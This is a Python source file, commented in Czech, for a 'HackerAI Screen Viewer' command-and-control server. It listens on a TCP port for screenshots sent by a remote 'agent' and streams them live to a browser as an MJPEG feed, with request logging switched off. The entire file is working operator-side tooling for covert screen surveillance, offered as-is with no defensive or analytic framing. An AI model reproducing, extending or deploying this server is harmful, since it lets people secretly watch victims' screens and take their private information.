#!/usr/bin/env python3
"""
Server pro příjem screenshotů z agenta.
Spustí HTTP server s live streamem v prohlížeči.
"""
import os
import sys
import time
import struct
import socket
import threading
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

HOST = "0.0.0.0"       # Poslouchá na všech rozhraních
PORT = 4443             # Port pro C2 komunikaci
WEB_PORT = 8080         # Port pro webové rozhraní

latest_frame = None
frame_lock = threading.Lock()
frame_counter = 0


class C2Handler:
    """Přijímá screenshoty od agenta po TCP."""
    
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((HOST, PORT))
        self.server.listen(5)
        print(f"[*] C2 server listening on {HOST}:{PORT}")
    
    def handle_client(self, conn, addr):
        global latest_frame, frame_counter
        print(f"[+] Agent connected: {addr}")
        data = b""
        while True:
            try:
                # Receive 4-byte length prefix
                header = conn.recv(4)
                if not header:
                    break
                msg_len = struct.unpack("!I", header)[0]
                
                # Receive the full frame data
                chunks = []
                received = 0
                while received < msg_len:
                    chunk = conn.recv(min(msg_len - received, 65536))
                    if not chunk:
                        break
                    chunks.append(chunk)
                    received += len(chunk)
                
                frame_data = b"".join(chunks)
                
                with frame_lock:
                    latest_frame = frame_data
                    frame_counter += 1
                    
            except (ConnectionResetError, BrokenPipeError, OSError):
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break
        
        print(f"[-] Agent disconnected: {addr}")
        conn.close()
    
    def start(self):
        while True:
            conn, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
            thread.start()


class WebHandler(BaseHTTPRequestHandler):
    """HTTP handler pro live stream v prohlížeči."""
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            html = self._get_index_html()
            self.wfile.write(html.encode())
            
        elif path == "/stream":
            self.send_response(200)
            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            
            last_count = -1
            while True:
                with frame_lock:
                    if latest_frame and frame_counter != last_count:
                        frame = latest_frame
                        last_count = frame_counter
                    else:
                        frame = None
                
                if frame:
                    try:
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n")
                        self.wfile.write(f"Content-Length: {len(frame)}\r\n".encode())
                        self.wfile.write(b"\r\n")
                        self.wfile.write(frame)
                        self.wfile.write(b"\r\n")
                    except (BrokenPipeError, ConnectionResetError):
                        break
                
                time.sleep(0.05)  # ~20 FPS
            
        elif path == "/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            with frame_lock:
                self.wfile.write(f'{{"frames": {frame_counter}}}'.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def _get_index_html(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>HackerAI Screen Viewer</title>
    <meta charset="utf-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace;
            display: flex; flex-direction: column; align-items: center; height: 100vh; overflow: hidden;
        }
        h1 { margin: 15px 0; font-size: 18px; letter-spacing: 3px; text-transform: uppercase; }
        .container { flex: 1; width: 100%; display: flex; justify-content: center; align-items: center; padding: 10px; }
        img { 
            max-width: 100%; max-height: 100%; 
            border: 1px solid #1a3a1a; border-radius: 4px;
            box-shadow: 0 0 30px rgba(0,255,0,0.05);
        }
        .info { color: #555; font-size: 12px; margin-bottom: 10px; }
        .status { color: #0f0; font-size: 11px; }
    </style>
</head>
<body>
    <h1>🔴 LIVE SCREEN · HACKERAI</h1>
    <div class="info">Waiting for agent connection on port """ + str(PORT) + """...</div>
    <div class="container">
        <img id="stream" src="/stream" />
    </div>
    <div class="status" id="status">No signal</div>
    <script>
        const img = document.getElementById('stream');
        const status = document.getElementById('status');
        img.onload = () => status.textContent = 'LIVE · ' + new Date().toLocaleTimeString();
        img.onerror = () => status.textContent = 'ERROR · Reconnecting...';
    </script>
</body>
</html>"""
    
    def log_message(self, format, *args):
        return  # Suppress HTTP server logs


def start_web_server():
    server = HTTPServer(("0.0.0.0", WEB_PORT), WebHandler)
    print(f"[*] Web interface: http://0.0.0.0:{WEB_PORT}")
    server.serve_forever()


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════╗
    ║     HackerAI Screen Viewer Server     ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Start C2 listener in background
    c2 = C2Handler()
    threading.Thread(target=c2.start, daemon=True).start()
    
    # Start web interface
    start_web_server()